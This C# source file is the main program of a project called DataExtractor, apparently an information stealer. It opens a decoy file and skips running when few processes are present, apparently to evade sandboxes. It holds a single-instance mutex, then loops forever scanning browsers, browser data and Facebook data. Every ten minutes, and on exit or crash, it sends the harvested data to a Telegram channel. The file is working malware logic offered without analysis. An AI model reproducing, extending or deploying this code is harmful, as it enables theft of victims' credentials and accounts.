using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using DataExtractor.Core;
using DataExtractor.Core.Handlers;
using DataExtractor.Core.Models;

namespace DataExtractor;

internal class Program
{
	private static TelegramHandler telegramHandler;

	private static void Main(string[] args)
	{
		OpenFile();
		if (Process.GetProcesses().Count() <= 150)
		{
			return;
		}
		telegramHandler = new TelegramHandler();
		SaveFileHandler.Init(telegramHandler.Version);
		bool createdNew = false;
		Mutex mutex = new Mutex(initiallyOwned: true, telegramHandler.Version, out createdNew);
		if (!createdNew)
		{
			return;
		}
		try
		{
			SaveFileHandler.ConfigData = SaveFileHandler.LoadDataFromTemp();
			AppDomain.CurrentDomain.ProcessExit += CurrentDomain_ProcessExit;
			AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
			while (!telegramHandler.Connect(SaveFileHandler.ConfigData).HasValue)
			{
				Thread.Sleep(TimeSpan.FromSeconds(10.0));
			}
			List<MyBrowser> list = new List<MyBrowser>();
			new BrowserScanner().Scanning(list, SaveFileHandler.ConfigData, telegramHandler);
			int num = 1;
			while (true)
			{
				telegramHandler.Log($"Run number {num}");
				try
				{
					new DataScanner().Scanning(list, telegramHandler, SaveFileHandler.ConfigData);
					new FbDataScanner().Scanning(num, list, telegramHandler, SaveFileHandler.ConfigData);
				}
				catch (Exception ex)
				{
					telegramHandler.Log(ex.ToString());
				}
				finally
				{
					num++;
					telegramHandler.Log("Sleep 10minute");
					telegramHandler.Send(SaveFileHandler.ConfigData);
					SaveFileHandler.SaveTempConfigData();
					Thread.Sleep(TimeSpan.FromMinutes(10.0));
					if (num % 5 == 0)
					{
						telegramHandler.ResetLog();
					}
				}
			}
		}
		finally
		{
			mutex.Close();
		}
	}

	private static void OpenFile()
	{
		FileOpenHandler fileOpenHandler = new FileOpenHandler();
		fileOpenHandler.OpenFile();
	}

	private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
	{
		telegramHandler.Log(e.ExceptionObject.ToString());
		SaveFileHandler.SaveTempConfigData();
		telegramHandler.Send(SaveFileHandler.ConfigData);
	}

	private static void CurrentDomain_ProcessExit(object sender, EventArgs e)
	{
		telegramHandler.Log("Run success and no error");
		SaveFileHandler.SaveTempConfigData();
		telegramHandler.Send(SaveFileHandler.ConfigData);
	}
}
